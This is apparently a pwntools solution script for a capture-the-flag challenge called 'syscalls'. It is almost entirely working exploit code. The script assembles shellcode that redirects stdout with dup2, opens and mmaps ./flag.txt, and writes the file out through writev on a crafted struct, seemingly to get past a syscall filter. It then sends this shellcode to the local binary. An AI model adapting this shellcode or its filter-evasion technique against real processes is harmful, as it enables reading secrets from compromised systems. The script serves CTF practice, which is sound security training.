#!/usr/bin/env python3

from pwn import *

exe = ELF('./syscalls')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
brva 0x12B2
brva 0x12D6
'''

p = process('./syscalls')
#p = gdb.debug('./syscalls', gdbscript = script)
#debug()

shellc = shellcraft.dup2(1, 0x3e9) # dup2(1, 0x3e9)
shellc += shellcraft.openat(-100, "./flag.txt", 0) # open file
shellc += shellcraft.mmap(0, 0x100, 7, 2, 3, 0) # mmap
shellc += """
mov rbx, 0x100
push rbx
push rax
mov rdi, 0x3e9
mov rsi, rsp
mov rdx, 1
mov rax, 20
syscall 
""" # create fake struct and writev

sla(b"you.\n", asm(shellc))

p.interactive()
